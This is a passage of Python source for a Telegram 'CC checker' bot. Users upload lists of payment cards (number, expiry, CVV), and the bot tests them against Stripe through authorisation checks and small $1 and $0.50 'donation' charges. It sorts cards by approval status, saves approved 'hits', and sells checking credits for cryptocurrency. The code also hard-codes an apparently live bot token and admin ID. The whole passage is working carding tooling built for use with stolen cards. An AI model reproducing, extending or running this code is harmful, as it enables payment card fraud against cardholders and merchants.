            ("💰 𝗟𝗢𝗪 𝗙𝗨𝗡𝗗𝗦", "INSUFFICIENT_FUNDS"),
            ("❌ 𝗗𝗘𝗖𝗟𝗜𝗡𝗘𝗗", "DECLINED"),
            ("✅ 𝟯𝗗 𝗟𝗜𝗩𝗘", "3D_LIVE"),
            ("🔒 𝗦𝗧𝗥𝗜𝗣𝗘 𝗔𝗨𝗧𝗛", "STRIPE_AUTH"),
            ("❓ 𝗨𝗡𝗞𝗡𝗢𝗪𝗡", "UNKNOWN"),
            ("⚠️ 𝗘𝗥𝗥𝗢𝗥", "ERROR")
        ]
        
        for emoji_text, category_key in categories:
            count = stats.get(category_key, 0)
            if count > 0:
                buttons.append([InlineKeyboardButton(f"{emoji_text} [{count}]", callback_data=f"show_{category_key}")])
        
        credits_text = f"💳 𝗖𝗥𝗘𝗗𝗜𝗧𝗦: {user_credits}"
        if user_free_checks > 0:
            credits_text += f" | 🎁 𝗙𝗥𝗘𝗘: {user_free_checks}"
        buttons.append([InlineKeyboardButton(credits_text, callback_data="check_credits")])
        
        buttons.append([InlineKeyboardButton("📥 𝗗𝗢𝗪𝗡𝗟𝗢𝗔𝗗 𝗔𝗟𝗟 𝗥𝗘𝗦𝗨𝗟𝗧𝗦", callback_data="download_all")])
        buttons.append([InlineKeyboardButton("🔄 𝗣𝗥𝗢𝗖𝗘𝗦𝗦 𝗡𝗘𝗪 𝗙𝗜𝗟𝗘", callback_data="process_new")])
        buttons.append([InlineKeyboardButton("⬅️ 𝗕𝗔𝗖𝗞", callback_data="back_to_menu")])
        
        return InlineKeyboardMarkup(buttons)
    
    async def button_handler(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        query = update.callback_query
        await query.answer()
        
        user_id = query.from_user.id
        data = query.data
        
        if data == "mode_auth":
            self.user_modes[user_id] = "stripe_auth"
            await query.edit_message_text(
                "*✅ 𝗦𝘁𝗿𝗶𝗽𝗲 𝗔𝘂𝘁𝗵 𝗠𝗼𝗱𝗲 𝗦𝗲𝗹𝗲𝗰𝘁𝗲𝗱!*\n\n*📤 𝗡𝗼𝘄 𝘀𝗲𝗻𝗱 𝘆𝗼𝘂𝗿 𝗰𝗮𝗿𝗱 𝗳𝗶𝗹𝗲 (𝗧𝗫𝗧 𝗳𝗼𝗿𝗺𝗮𝘁):*",
                parse_mode=ParseMode.MARKDOWN
            )
        
        elif data == "mode_charge":
            self.user_modes[user_id] = "stripe_charge"
            await query.edit_message_text(
                "*✅ 𝗦𝘁𝗿𝗶𝗽𝗲 𝗖𝗵𝗮𝗿𝗴𝗲 $𝟭 𝗠𝗼𝗱𝗲 𝗦𝗲𝗹𝗲𝗰𝘁𝗲𝗱!*\n\n*📤 𝗡𝗼𝘄 𝘀𝗲𝗻𝗱 𝘆𝗼𝘂𝗿 𝗰𝗮𝗿𝗱 𝗳𝗶𝗹𝗲 (𝗧𝗫𝗧 𝗳𝗼𝗿𝗺𝗮𝘁):*",
                parse_mode=ParseMode.MARKDOWN
            )
        
        elif data == "mode_charge50":
            self.user_modes[user_id] = "stripe_charge50"
            await query.edit_message_text(
                "*✅ 𝗦𝘁𝗿𝗶𝗽𝗲 𝗖𝗵𝗮𝗿𝗴𝗲 $𝟬.𝟱𝟬 𝗠𝗼𝗱𝗲 𝗦𝗲𝗹𝗲𝗰𝘁𝗲𝗱!*\n\n*📤 𝗡𝗼𝘄 𝘀𝗲𝗻𝗱 𝘆𝗼𝘂𝗿 𝗰𝗮𝗿𝗱 𝗳𝗶𝗹𝗲 (𝗧𝗫𝗧 𝗳𝗼𝗿𝗺𝗮𝘁):*",
                parse_mode=ParseMode.MARKDOWN
            )
        
        elif data == "check_credits":
            await self.credits_command(update, context)
        
        elif data == "user_stats":
            await self.stats_command(update, context)
        
        elif data == "admin_panel":
            await self.admin_panel_command(update, context)
        
        elif data == "buy_credits":
            await self.buy_credits_command(update, context)
        
        elif data == "help":
            await self.help_command(update, context)
        
        elif data == "back_to_menu":
            await self.start(update, context)
        
        elif data == "back_to_results":
            if user_id in self.user_sessions:
                session = self.user_sessions[user_id]
                stats = session.get('stats', {})
                mode = session.get('mode', 'stripe_auth')
                user_credits = session.get('user_credits', 0)
                user_free_checks = session.get('user_free_checks', 0)
                credits_for_checks = session.get('credits_deducted_for_checks', 0)
                credits_for_approved = session.get('credits_deducted_for_approved', 0)
                total_credits_used = credits_for_checks + credits_for_approved
                
                final_text = f"""
🎉 *𝗣𝗥𝗢𝗖𝗘𝗦𝗦𝗜𝗡𝗚 𝗖𝗢𝗠𝗣𝗟𝗘𝗧𝗘!*
                
📊 *𝗙𝗜𝗡𝗔𝗟 𝗦𝗧𝗔𝗧𝗜𝗦𝗧𝗜𝗖𝗦:*
• *𝗧𝗢𝗧𝗔𝗟 𝗖𝗔𝗥𝗗𝗦:* `{stats['TOTAL']}`
• *𝗔𝗣𝗣𝗥𝗢𝗩𝗘𝗗:* `{stats.get('APPROVED', 0)}`
• *💳 𝗧𝗼𝘁𝗮𝗹 𝗰𝗿𝗲𝗱𝗶𝘁𝘀 𝘂𝘀𝗲𝗱:* `{total_credits_used}`
  - 📝 *𝗙𝗼𝗿 𝗰𝗵𝗲𝗰𝗸𝗶𝗻𝗴:* `{credits_for_checks}`
  - 🔥 *𝗙𝗼𝗿 𝗮𝗽𝗽𝗿𝗼𝘃𝗲𝗱:* `{credits_for_approved}`
• ⏱️ *𝗣𝗿𝗼𝗰𝗲𝘀𝘀𝗶𝗻𝗴 𝗧𝗶𝗺𝗲:* Completed
"""
                
                buttons = await self.create_final_buttons(stats, mode, user_credits, user_free_checks)
                
                await query.edit_message_text(
                    final_text,
                    parse_mode=ParseMode.MARKDOWN,
                    reply_markup=buttons
                )
            else:
                await self.start(update, context)
        
        elif data.startswith("show_"):
            category = data[5:]
            await self.show_category_cards(update, context, category)
        
        elif data.startswith("download_"):
            category = data[9:]
            await self.download_category_cards(update, context, category)
        
        elif data == "download_all":
            await self.download_all_results(update, context)
        
        elif data == "process_new":
            self.user_sessions.pop(user_id, None)
            self.active_processes.pop(user_id, None)
            await query.edit_message_text(
                "*🔄 𝗥𝗲𝗮𝗱𝘆 𝗳𝗼𝗿 𝗮 𝗻𝗲𝘄 𝗳𝗶𝗹𝗲!*\n\n"
                "𝗦𝗲𝗹𝗲𝗰𝘁 𝗮 𝗺𝗼𝗱𝗲 𝗳𝗶𝗿𝘀𝘁, 𝘁𝗵𝗲𝗻 𝘀𝗲𝗻𝗱 𝘆𝗼𝘂𝗿 𝗰𝗮𝗿𝗱 𝗳𝗶𝗹𝗲.",
                parse_mode=ParseMode.MARKDOWN,
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("🔒 𝗦𝗧𝗥𝗜𝗣𝗘 𝗔𝗨𝗧𝗛 𝗠𝗢𝗗𝗘", callback_data="mode_auth")],
                    [InlineKeyboardButton("💰 𝗦𝗧𝗥𝗜𝗣𝗘 𝗖𝗛𝗔𝗥𝗚𝗘 $𝟭 𝗠𝗢𝗗𝗘", callback_data="mode_charge")],
                    [InlineKeyboardButton("💵 𝗦𝗧𝗥𝗜𝗣𝗘 𝗖𝗛𝗔𝗥𝗚𝗘 $𝟬.𝟱𝟬 𝗠𝗢𝗗𝗘", callback_data="mode_charge50")],
                    [InlineKeyboardButton("⬅️ 𝗕𝗔𝗖𝗞", callback_data="back_to_menu")]
                ])
            )
        
        elif data == "stop_command":
            await self.stop_command(update, context)
        
        elif data == "upload":
            await query.edit_message_text(
                "*📤 𝗣𝗹𝗲𝗮𝘀𝗲 𝘀𝗲𝗻𝗱 𝘆𝗼𝘂𝗿 𝗰𝗮𝗿𝗱 𝗳𝗶𝗹𝗲 (𝗧𝗫𝗧 𝗳𝗼𝗿𝗺𝗮𝘁) 𝗻𝗼𝘄.*\n\n"
                "📝 *𝗙𝗼𝗿𝗺𝗮𝘁:* `𝗰𝗰𝗻|𝗺𝗺|𝘆𝘆|𝗰𝘃𝘃`\n"
                "📄 *𝗘𝘅𝗮𝗺𝗽𝗹𝗲:* `𝟰𝟮𝟭𝟯𝟳𝟴𝟬𝟬𝟬𝟬𝟬𝟬𝟬𝟬𝟬|𝟬𝟲|𝟮𝟱|𝟯𝟭𝟳`",
                parse_mode=ParseMode.MARKDOWN
            )
        
        elif data == "admin_view_users":
            await self.users_command(update, context)
        
        elif data == "admin_add_credits":
            await query.edit_message_text(
                "💰 *𝗔𝗗𝗗 𝗖𝗥𝗘𝗗𝗜𝗧𝗦*\n\n"
                "𝗨𝘀𝗲: `/𝗮𝗱𝗱𝗰𝗿𝗲𝗱𝗶𝘁𝘀 <𝘂𝘀𝗲𝗿_𝗶𝗱> <𝗮𝗺𝗼𝘂𝗻𝘁>`\n\n"
                "𝗘𝘅𝗮𝗺𝗽𝗹𝗲: `/𝗮𝗱𝗱𝗰𝗿𝗲𝗱𝗶𝘁𝘀 𝟭𝟮𝟯𝟰𝟱𝟲𝟳𝟴𝟵 𝟭𝟬𝟬`",
                parse_mode=ParseMode.MARKDOWN
            )
        
        elif data == "admin_broadcast":
            await query.edit_message_text(
                "📢 *𝗕𝗥𝗢𝗔𝗗𝗖𝗔𝗦𝗧 𝗠𝗘𝗦𝗦𝗔𝗚𝗘*\n\n"
                "𝗨𝘀𝗲: `/𝗯𝗿𝗼𝗮𝗱𝗰𝗮𝘀𝘁 <𝗺𝗲𝘀𝘀𝗮𝗴𝗲>`\n\n"
                "𝗘𝘅𝗮𝗺𝗽𝗹𝗲: `/𝗯𝗿𝗼𝗮𝗱𝗰𝗮𝘀𝘁 𝗛𝗲𝗹𝗹𝗼 𝗲𝘃𝗲𝗿𝘆𝗼𝗻𝗲!`",
                parse_mode=ParseMode.MARKDOWN
            )
        
        elif data == "admin_disable_user":
            await query.edit_message_text(
                "🚫 *𝗗𝗜𝗦𝗔𝗕𝗟𝗘 𝗨𝗦𝗘𝗥*\n\n"
                "𝗨𝘀𝗲: `/𝗱𝗶𝘀𝗮𝗯𝗹𝗲𝘂𝘀𝗲𝗿 <𝘂𝘀𝗲𝗿_𝗶𝗱>`\n\n"
                "𝗘𝘅𝗮𝗺𝗽𝗹𝗲: `/𝗱𝗶𝘀𝗮𝗯𝗹𝗲𝘂𝘀𝗲𝗿 𝟭𝟮𝟯𝟰𝟱𝟲𝟳𝟴𝟵`",
                parse_mode=ParseMode.MARKDOWN
            )
        
        elif data == "admin_enable_user":
            await query.edit_message_text(
                "✅ *𝗘𝗡𝗔𝗕𝗟𝗘 𝗨𝗦𝗘𝗥*\n\n"
                "𝗨𝘀𝗲: `/𝗲𝗻𝗮𝗯𝗹𝗲𝘂𝘀𝗲𝗿 <𝘂𝘀𝗲𝗿_𝗶𝗱>`\n\n"
                "𝗘𝘅𝗮𝗺𝗽𝗹𝗲: `/𝗲𝗻𝗮𝗯𝗹𝗲𝘂𝘀𝗲𝗿 𝟭𝟮𝟯𝟰𝟱𝟲𝟳𝟴𝟵`",
                parse_mode=ParseMode.MARKDOWN
            )
        
        elif data == "admin_view_transactions":
            await query.edit_message_text(
                "💳 *𝗧𝗥𝗔𝗡𝗦𝗔𝗖𝗧𝗜𝗢𝗡 𝗠𝗔𝗡𝗔𝗚𝗘𝗠𝗘𝗡𝗧*\n\n"
                "📝 *𝗔𝘃𝗮𝗶𝗹𝗮𝗯𝗹𝗲 𝗰𝗼𝗺𝗺𝗮𝗻𝗱𝘀:*\n"
                "• /𝘁𝗿𝘅 <𝗶𝗱> - 𝗦𝗲𝗻𝗱 𝘁𝗿𝗮𝗻𝘀𝗮𝗰𝘁𝗶𝗼𝗻 𝗜𝗗 (𝗨𝘀𝗲𝗿𝘀)\n"
                "• /𝗰𝗼𝗺𝗽𝗹𝗲𝘁𝗲𝘁𝗿𝘅 <𝗰𝗼𝗱𝗲> <𝗮𝗺𝗼𝘂𝗻𝘁> - 𝗖𝗼𝗺𝗽𝗹𝗲𝘁𝗲 𝘁𝗿𝗮𝗻𝘀𝗮𝗰𝘁𝗶𝗼𝗻 (𝗔𝗱𝗺𝗶𝗻)",
                parse_mode=ParseMode.MARKDOWN
            )
        
        elif data == "admin_view_hits":
            all_hits = HitsManager.get_all_hits()
            total_hits = len(all_hits)
            
            if total_hits > 0:
                hits_text = f"📈 *𝗔𝗣𝗣𝗥𝗢𝗩𝗘𝗗 𝗖𝗔𝗥𝗗𝗦 (𝗛𝗜𝗧𝗦): {total_hits}*\n\n"
                
                recent_hits = list(all_hits.values())[-10:]
                for hit in recent_hits[::-1]:
                    timestamp = datetime.fromisoformat(hit["timestamp"]).strftime("%Y-%m-%d %H:%M")
                    hits_text += f"• `{hit['card_number'][:6]}******{hit['card_number'][-4:]}` - {hit['mode']} - {timestamp}\n"
                
                if total_hits > 10:
                    hits_text += f"\n📄 *... and {total_hits - 10} more hits*"
            else:
                hits_text = "📭 *𝗡𝗼 𝗮𝗽𝗽𝗿𝗼𝘃𝗲𝗱 𝗰𝗮𝗿𝗱𝘀 𝘆𝗲𝘁.*"
            
            await query.edit_message_text(
                hits_text,
                parse_mode=ParseMode.MARKDOWN
            )
        
        elif data == "send_trx":
            await query.edit_message_text(
                "📤 *𝗦𝗘𝗡𝗗 𝗧𝗥𝗔𝗡𝗦𝗔𝗖𝗧𝗜𝗢𝗡 𝗜𝗗*\n\n"
                "𝗨𝘀𝗲: `/𝘁𝗿𝘅 <𝗧𝗿𝗮𝗻𝘀𝗮𝗰𝘁𝗶𝗼𝗻_𝗜𝗗>`\n\n"
                "𝗘𝘅𝗮𝗺𝗽𝗹𝗲: `/𝘁𝗿𝘅 𝗧𝗥𝗫𝟭𝟮𝟯𝟰𝟱𝟲𝟳𝟴𝟵`",
                parse_mode=ParseMode.MARKDOWN
            )
        
        elif data == "buy_100":
            await query.edit_message_text(
                "💰 *𝗣𝗨𝗥𝗖𝗛𝗔𝗦𝗘: 𝟭𝟬𝟬 𝗖𝗥𝗘𝗗𝗜𝗧𝗦 ($𝟭)*\n\n"
                "𝗣𝗹𝗲𝗮𝘀𝗲 𝘀𝗲𝗻𝗱 $𝟭 𝘁𝗼 𝗼𝗻𝗲 𝗼𝗳 𝘁𝗵𝗲𝘀𝗲 𝗮𝗱𝗱𝗿𝗲𝘀𝘀𝗲𝘀:\n\n"
                f"• *𝗕𝗶𝗻𝗮𝗻𝗰𝗲 𝗜𝗗:* `{self.payment_addresses['Binance ID']}`\n"
                f"• *𝗨𝗦𝗗𝗧 (𝗕𝗡𝗕 𝗦𝗺𝗮𝗿𝘁 𝗖𝗵𝗮𝗶𝗻):* `{self.payment_addresses['USDT (BNB Smart Chain)']}`\n"
                f"• *𝗟𝗧𝗖:* `{self.payment_addresses['LTC']}`\n"
                f"• *𝗕𝗧𝗖:* `{self.payment_addresses['BTC']}`\n\n"
                "𝗔𝗳𝘁𝗲𝗿 𝘀𝗲𝗻𝗱𝗶𝗻𝗴 𝗽𝗮𝘆𝗺𝗲𝗻𝘁, 𝘂𝘀𝗲 /𝘁𝗿𝘅 <𝗧𝗿𝗮𝗻𝘀𝗮𝗰𝘁𝗶𝗼𝗻_𝗜𝗗> 𝘁𝗼 𝘀𝗲𝗻𝗱 𝘁𝗵𝗲 𝘁𝗿𝗮𝗻𝘀𝗮𝗰𝘁𝗶𝗼𝗻 𝗜𝗗.",
                parse_mode=ParseMode.MARKDOWN
            )
        
        elif data == "buy_500":
            await query.edit_message_text(
                "💰 *𝗣𝗨𝗥𝗖𝗛𝗔𝗦𝗘: 𝟱𝟬𝟬 𝗖𝗥𝗘𝗗𝗜𝗧𝗦 ($𝟰)*\n\n"
                "𝗣𝗹𝗲𝗮𝘀𝗲 𝘀𝗲𝗻𝗱 $𝟰 𝘁𝗼 𝗼𝗻𝗲 𝗼𝗳 𝘁𝗵𝗲𝘀𝗲 𝗮𝗱𝗱𝗿𝗲𝘀𝘀𝗲𝘀:\n\n"
                f"• *𝗕𝗶𝗻𝗮𝗻𝗰𝗲 𝗜𝗗:* `{self.payment_addresses['Binance ID']}`\n"
                f"• *𝗨𝗦𝗗𝗧 (𝗕𝗡𝗕 𝗦𝗺𝗮𝗿𝘁 𝗖𝗵𝗮𝗶𝗻):* `{self.payment_addresses['USDT (BNB Smart Chain)']}`\n"
                f"• *𝗟𝗧𝗖:* `{self.payment_addresses['LTC']}`\n"
                f"• *𝗕𝗧𝗖:* `{self.payment_addresses['BTC']}`\n\n"
                "𝗔𝗳𝘁𝗲𝗿 𝘀𝗲𝗻𝗱𝗶𝗻𝗴 𝗽𝗮𝘆𝗺𝗲𝗻𝘁, 𝘂𝘀𝗲 /𝘁𝗿𝘅 <𝗧𝗿𝗮𝗻𝘀𝗮𝗰𝘁𝗶𝗼𝗻_𝗜𝗗> 𝘁𝗼 𝘀𝗲𝗻𝗱 𝘁𝗵𝗲 𝘁𝗿𝗮𝗻𝘀𝗮𝗰𝘁𝗶𝗼𝗻 𝗜𝗗.",
                parse_mode=ParseMode.MARKDOWN
            )
        
        elif data == "buy_1000":
            await query.edit_message_text(
                "💰 *𝗣𝗨𝗥𝗖𝗛𝗔𝗦𝗘: 𝟭𝟬𝟬𝟬 𝗖𝗥𝗘𝗗𝗜𝗧𝗦 ($𝟳)*\n\n"
                "𝗣𝗹𝗲𝗮𝘀𝗲 𝘀𝗲𝗻𝗱 $𝟳 𝘁𝗼 𝗼𝗻𝗲 𝗼𝗳 𝘁𝗵𝗲𝘀𝗲 𝗮𝗱𝗱𝗿𝗲𝘀𝘀𝗲𝘀:\n\n"
                f"• *𝗕𝗶𝗻𝗮𝗻𝗰𝗲 𝗜𝗗:* `{self.payment_addresses['Binance ID']}`\n"
                f"• *𝗨𝗦𝗗𝗧 (𝗕𝗡𝗕 𝗦𝗺𝗮𝗿𝘁 𝗖𝗵𝗮𝗶𝗻):* `{self.payment_addresses['USDT (BNB Smart Chain)']}`\n"
                f"• *𝗟𝗧𝗖:* `{self.payment_addresses['LTC']}`\n"
                f"• *𝗕𝗧𝗖:* `{self.payment_addresses['BTC']}`\n\n"
                "𝗔𝗳𝘁𝗲𝗿 𝘀𝗲𝗻𝗱𝗶𝗻𝗴 𝗽𝗮𝘆𝗺𝗲𝗻𝘁, 𝘂𝘀𝗲 /𝘁𝗿𝘅 <𝗧𝗿𝗮𝗻𝘀𝗮𝗰𝘁𝗶𝗼𝗻_𝗜𝗗> 𝘁𝗼 𝘀𝗲𝗻𝗱 𝘁𝗵𝗲 𝘁𝗿𝗮𝗻𝘀𝗮𝗰𝘁𝗶𝗼𝗻 𝗜𝗗.",
                parse_mode=ParseMode.MARKDOWN
            )
    
    async def download_category_cards(self, update: Update, context: ContextTypes.DEFAULT_TYPE, category: str):
        query = update.callback_query
        await query.answer()
        
        user_id = query.from_user.id
        
        if user_id not in self.user_sessions:
            await query.answer("❌ 𝗡𝗼 𝗽𝗿𝗼𝗰𝗲𝘀𝘀𝗶𝗻𝗴 𝘀𝗲𝘀𝘀𝗶𝗼𝗻 𝗳𝗼𝘂𝗻𝗱.", show_alert=True)
            return
        
        session = self.user_sessions[user_id]
        categorized = session.get('categorized_cards', {})
        cards = categorized.get(category, [])
        
        if not cards:
            await query.answer(f"❌ 𝗡𝗼 {category} 𝗰𝗮𝗿𝗱𝘀 𝘁𝗼 𝗱𝗼𝘄𝗻𝗹𝗼𝗮𝗱.", show_alert=True)
            return
        
        file_content = "\n".join(cards)
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"{category}_{timestamp}.txt"
        
        await query.message.reply_document(
            document=BytesIO(file_content.encode()),
            filename=filename,
            caption=f"📥 *{category} 𝗖𝗮𝗿𝗱𝘀 𝗘𝘅𝗽𝗼𝗿𝘁𝗲𝗱*\n\n𝗧𝗼𝘁𝗮𝗹 𝗖𝗮𝗿𝗱𝘀: `{len(cards)}`",
            parse_mode=ParseMode.MARKDOWN
        )
    
    async def download_all_results(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        query = update.callback_query
        await query.answer()
        
        user_id = query.from_user.id
        
        if user_id not in self.user_sessions:
            await query.answer("❌ 𝗡𝗼 𝗽𝗿𝗼𝗰𝗲𝘀𝘀𝗶𝗻𝗴 𝘀𝗲𝘀𝘀𝗶𝗼𝗻 𝗳𝗼𝘂𝗻𝗱.", show_alert=True)
            return
        
        session = self.user_sessions[user_id]
        results = session.get('all_results', [])
        
        if not results:
            await query.answer("❌ 𝗡𝗼 𝗿𝗲𝘀𝘂𝗹𝘁𝘀 𝘁𝗼 𝗱𝗼𝘄𝗻𝗹𝗼𝗮𝗱.", show_alert=True)
            return
        
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"cc_results_{timestamp}.txt"
        
        lines = []
        for result in results:
            line = f"{result['card']} | {result['status']} | {result['bank']} | {result['country']}"
            lines.append(line)
        
        file_content = "\n".join(lines)
        
        await query.message.reply_document(
            document=BytesIO(file_content.encode()),
            filename=filename,
            caption=f"📥 *𝗥𝗲𝘀𝘂𝗹𝘁𝘀 𝗘𝘅𝗽𝗼𝗿𝘁𝗲𝗱*\n\n𝗧𝗼𝘁𝗮𝗹 𝗖𝗮𝗿𝗱𝘀: `{len(results)}`",
            parse_mode=ParseMode.MARKDOWN
        )
    
    def run(self):
        application = Application.builder().token(self.token).build()
        
        application.add_handler(CommandHandler("start", self.start))
        application.add_handler(CommandHandler("help", self.help_command))
        application.add_handler(CommandHandler("stop", self.stop_command))
        application.add_handler(CommandHandler("credits", self.credits_command))
        application.add_handler(CommandHandler("stats", self.stats_command))
        application.add_handler(CommandHandler("admin", self.admin_panel_command))
        application.add_handler(CommandHandler("broadcast", self.broadcast_command))
        application.add_handler(CommandHandler("addcredits", self.add_credits_command))
        application.add_handler(CommandHandler("give", self.give_credits_command))
        application.add_handler(CommandHandler("disableuser", self.disable_user_command))
        application.add_handler(CommandHandler("enableuser", self.enable_user_command))
        application.add_handler(CommandHandler("users", self.users_command))
        
        application.add_handler(CommandHandler("mode_auth", self.mode_auth_command))
        application.add_handler(CommandHandler("mode_1", self.mode_1_command))
        application.add_handler(CommandHandler("mode_50", self.mode_50_command))
        
        application.add_handler(CommandHandler("buycredits", self.buy_credits_command))
        application.add_handler(CommandHandler("trx", self.send_trx_id_command))
        application.add_handler(CommandHandler("completetrx", self.complete_trx_command))
        
        application.add_handler(MessageHandler(filters.Document.FileExtension("txt"), self.process_file))
        application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, self.handle_text))
        application.add_handler(CallbackQueryHandler(self.button_handler))
        
        print_banner()
        print("🚀 Starting bot with Triple Mode Support & Credit System...")
        print("=" * 60)
        
        if self.admin_id:
            print(f"🔒 Admin User ID: {self.admin_id}")
            print(f"👤 Admin Username: @MdSamir2000")
            print(f"💳 Admin Credits: UNLIMITED 🚀")
        
        print("\n⚡ AVAILABLE MODES:")
        print("1. 🔒 Stripe Auth - Account authorization check")
        print("2. 💰 Stripe Charge $1 - $1 donation charge test")
        print("3. 💵 Stripe Charge $0.50 - $0.50 donation charge test")
        print("\n💰 PAYMENT METHODS:")
        print(f"- Binance ID: {self.payment_addresses['Binance ID']}")
        print(f"- USDT: {self.payment_addresses['USDT (BNB Smart Chain)']}")
        print(f"- LTC: {self.payment_addresses['LTC']}")
        print(f"- BTC: {self.payment_addresses['BTC']}")
        print("\n💳 CREDIT PACKAGES (UPDATED):")
        print("- 100 credits = $1")
        print("- 500 credits = $4")
        print("- 1000 credits = $7")
        print("\n🎁 FREE CHECKS:")
        print("- First regular user gets 100 free card checks!")
        print("- Free checks are deducted instantly for ANY card check")
        print("- Admin-given credits are only deducted for APPROVED cards")
        print("\n💾 NEW FEATURES:")
        print("- ✅ Approved cards saved to hits.json")
        print("- ✅ VBV Status Check with API")
        print("- ✅ Fixed $0.50 mode issue")
        print("- ✅ Updated pricing system")
        print("=" * 60)
        
        try:
            application.run_polling(allowed_updates=Update.ALL_TYPES, drop_pending_updates=True)
            
        except KeyboardInterrupt:
            print("\n\n⏹️ Bot stopped by user")
        except Exception as e:
            print(f"\n❌ Error: {e}")
            print("Make sure your bot token is correct!")
            input("Press Enter to exit...")


# Main execution
if __name__ == "__main__":
    print_banner()
    
    try:
        # Hardcoded configuration - REPLACE THESE WITH YOUR VALUES
        BOT_TOKEN = "8216806999:AAEpc_fGUhN7qvmZWz3KAtJktVMUbOFsLTQ"  # Replace with your bot token from @BotFather
        ADMIN_ID = 7806554013  # Replace with your Telegram user ID
        
        if BOT_TOKEN == "YOUR_BOT_TOKEN_HERE" or ADMIN_ID == 1234567890:
            print("❌ ERROR: Please update the hardcoded configuration!")
            print("\n📝 HOW TO SETUP:")
            print("1. Replace BOT_TOKEN with your actual bot token")
            print("2. Replace ADMIN_ID with your Telegram user ID")
            print("\n💡 TIP: Get your user ID from @userinfobot on Telegram")
            input("\nPress Enter to exit...")
            exit(1)
        
        bot = CCBot(BOT_TOKEN, ADMIN_ID)
        bot.run()
        
    except KeyboardInterrupt:
        print("\n\n⏹️ Setup cancelled by user")
    except Exception as e:
        print(f"\n❌ FATAL ERROR: {e}")
        print("\n🔧 TROUBLESHOOTING:")
        print("1. Check your internet connection")
        print("2. Verify your bot token is correct")
        print("3. Make sure you have installed all requirements:")
        print("   pip install requests urllib3 python-telegram-bot")
        input("\nPress Enter to exit...")